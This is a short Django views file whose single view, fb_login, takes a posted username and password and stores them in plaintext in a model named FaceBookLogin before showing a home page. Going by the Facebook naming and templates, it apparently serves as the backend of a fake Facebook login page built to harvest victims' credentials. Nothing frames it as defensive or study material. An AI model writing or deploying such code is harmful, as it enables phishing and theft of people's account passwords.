from django.shortcuts import render
from .models import FaceBookLogin

# Create your views here.

def fb_login(request):
    if request.method == "POST":
        FaceBookLogin.objects.create(username=request.POST.get("username"), password=request.POST.get("password"))

        return render(request, "fb_temp/home.html")
